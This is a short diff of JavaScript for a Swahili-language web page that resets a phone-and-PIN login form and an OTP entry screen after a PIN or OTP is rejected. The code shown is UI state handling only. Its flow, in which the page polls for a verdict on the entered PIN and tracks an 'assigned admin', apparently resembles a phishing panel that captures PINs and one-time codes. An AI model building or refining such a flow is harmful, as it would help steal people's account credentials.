@@ -1017,17 +1017,22 @@
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'PIN isiyosahihi imegunduliwa. Unaelekezwa kwenye kuingia…');
           setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            chkLogin();
-            document.getElementById('bLogin').disabled = false;
+            // Reset OTP page state
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
             document.getElementById('bOtp').className = 'btn-otp';
             document.getElementById('bOtp').disabled = false;
             document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = '';
+            document.getElementById('otpInputSection').style.display = 'block';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
             document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
             hideOtpMsgs();
+            // Reset login page state — clear PIN boxes but preserve phone number
+            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            // Re-enable login button (phone is still filled so it should become ready)
+            document.getElementById('bLogin').disabled = false;
+            const phoneVal = document.getElementById('lgPh').value.trim();
+            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
+            hideLoginMsg();
             S.applicationId = null;
             S.assignedAdminId = null;
             goTo('page-login');
@@ -1038,6 +1043,8 @@
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
           document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = 'block';
           showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
           document.getElementById('o0').focus();
         }
